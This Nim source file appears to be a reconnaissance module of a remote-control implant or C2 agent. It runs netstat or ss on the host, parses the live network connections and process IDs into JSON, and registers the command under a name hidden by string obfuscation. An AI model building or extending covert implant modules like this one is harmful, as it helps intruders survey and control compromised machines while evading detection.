import std/[json, osproc, strutils]
import core/types
import commands/registry
import crypto/strenc

proc parseNetstatWindows(output: string): JsonNode =
  let connArr = newJArray()
  for line in output.splitLines():
    let parts = line.strip().splitWhitespace()
    if parts.len < 4: continue
    let proto = parts[0]
    if proto notin ["TCP", "UDP"]: continue
    var entry = newJObject()
    entry["proto"]  = %proto
    entry["local"]  = %parts[1]
    entry["remote"] = %parts[2]
    if proto == "TCP" and parts.len >= 5:
      entry["state"] = %parts[3]
      entry["pid"]   = %parts[4]
    else:
      entry["state"] = %""
      entry["pid"]   = %parts[3]
    connArr.add(entry)
  result = newJObject()
  result["connections"] = connArr

proc parseNetstatLinux(output: string): JsonNode =
  let connArr = newJArray()
  var firstLine = true
  for line in output.splitLines():
    if firstLine:
      firstLine = false
      continue
    let parts = line.strip().splitWhitespace()
    if parts.len < 5: continue
    var entry = newJObject()
    entry["proto"]  = %parts[0]
    entry["state"]  = %parts[1]
    entry["local"]  = %parts[4]
    entry["remote"] = if parts.len >= 6: %parts[5] else: %"*:*"
    var pid = ""
    if parts.len >= 7:
      let procInfo = parts[6..^1].join(" ")
      let idx = procInfo.find("pid=")
      if idx >= 0:
        var i = idx + 4
        while i < procInfo.len and procInfo[i].isDigit():
          pid.add(procInfo[i])
          inc i
    entry["pid"] = %pid
    connArr.add(entry)
  result = newJObject()
  result["connections"] = connArr

proc netstatExecute(taskId: string, params: JsonNode, state: AgentState,
                    send: SendMsg): TaskResult =
  try:
    when defined(windows):
      let (out1, _) = execCmdEx("netstat -ano", options = {poStdErrToStdOut})
      let data = parseNetstatWindows(out1)
      return TaskResult(output: $data, status: "success", completed: true)
    else:
      let (out1, code1) = execCmdEx("ss -tunap", options = {poStdErrToStdOut})
      let raw = if code1 == 0: out1
                else: execCmdEx("netstat -tunap", options = {poStdErrToStdOut})[0]
      let data = parseNetstatLinux(raw)
      return TaskResult(output: $data, status: "success", completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initNetstat*() =
  register(hidstr("netstat"), netstatExecute)
